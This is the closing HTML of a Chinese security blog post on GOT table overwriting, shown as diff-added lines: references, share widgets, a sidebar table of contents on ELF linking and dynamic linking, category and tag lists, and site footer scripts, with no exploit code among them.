+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>《程序员的自我修养》<br><a target="_blank" rel="noopener" href="https://www.icourse163.org/course/NJU-1001625001">《计算机系统基础(一)：程序的表示、转换与链接》</a></p>
+<p>注：本文首发于<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183370#h2-14">安全客 </a> </p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/2019/09/05/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/2019/09/05/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3GOT%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/";
+            const title         = "「深入理解GOT表覆写技术」";
+            const excerpt       = `前言玩pwn的时候，有时要用到got表覆写技术，本文在于分享对GOT表覆写技术的理解，铺垫性的基础知识较多，目的在于让初学者知其然，还要知其所以然！`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Got/" rel="tag">Got</a>, <a class="tag-none-link" href="/tags/PLT/" rel="tag">PLT</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2023-07-28T08:51:33.249Z" itemprop="dateModified">最后编辑：2023-07-28</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" write函数" href="/2019/08/26/write函数/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" DC靶机" href="/2019/09/06/DC靶机/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.png" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                10
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                5
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-text">ELF文件生成过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B"><span class="toc-text">预处理过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B"><span class="toc-text">编译过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E8%BF%87%E7%A8%8B"><span class="toc-text">汇编过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B"><span class="toc-text">链接过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%A6%82%E8%BF%B0"><span class="toc-text">目标文件格式概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%B1%BB%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="toc-text">三类目标文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E7%9A%84%E5%87%A0%E7%A7%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-text">标准的几种目标文件格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E8%A7%86%E5%9B%BE"><span class="toc-text">两种视图</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="toc-text">ELF可重定位目标文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6"><span class="toc-text">ELF可执行目标文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E5%8F%8A%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-text">符号及符号表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="toc-text">链接操作的步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%92%8C%E7%AC%A6%E5%8F%B7%E8%A7%A3%E6%9E%90"><span class="toc-text">静态链接和符号解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%A0%E8%BD%BD"><span class="toc-text">可执行文件的加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E3%80%90%E5%88%92%E9%87%8D%E7%82%B9%E3%80%91"><span class="toc-text">共享库和动态链接【划重点】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E9%83%A8%E5%88%86"><span class="toc-text">实践部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E3%80%8A%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%EF%BC%88C%E8%AF%AD%E8%A8%80%E7%89%88%EF%BC%89%E3%80%8B/">《系统编程实践（C语言版）》</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/">软件破解</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/DynELF/" style="font-size: 0.6em;">DynELF</a> <a href="/tags/Got/" style="font-size: 0.6em;">Got</a> <a href="/tags/NX/" style="font-size: 0.6em;">NX</a> <a href="/tags/PLT/" style="font-size: 0.6em;">PLT</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 0.6em;">SQL注入</a> <a href="/tags/SSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/" style="font-size: 0.6em;">SSH免密登录</a> <a href="/tags/canary/" style="font-size: 0.6em;">canary</a> <a href="/tags/pie/" style="font-size: 0.6em;">pie</a> <a href="/tags/relro/" style="font-size: 0.6em;">relro</a> <a href="/tags/system-programming/" style="font-size: 0.6em;">system programming</a> <a href="/tags/write%E5%87%BD%E6%95%B0/" style="font-size: 0.6em;">write函数</a> <a href="/tags/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/" style="font-size: 0.6em;">软件破解</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/07/27/Chapter1_IO/"><i class="fa  fa-book"></i> Chapter1_IO</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/07/19/%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3%E6%96%B0%E7%89%88BurpSuite/"><i class="fa  fa-book"></i> 安装破解新版BurpSuite</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/07/15/floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"><i class="fa  fa-book"></i> floor报错注入原理分析</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/07/14/CentOS%207%E9%85%8D%E7%BD%AESSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"><i class="fa  fa-book"></i> CentOS 7配置SSH免密登录</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2019/09/06/DC%E9%9D%B6%E6%9C%BA/"><i class="fa  fa-book"></i> DC靶机</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <!-- Keep for compatibility -->
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <!-- New links -->
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2023 江城子同学 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by flyingfox.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="snow-switch">
+                        <span class="fa fa-snowflake-o"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
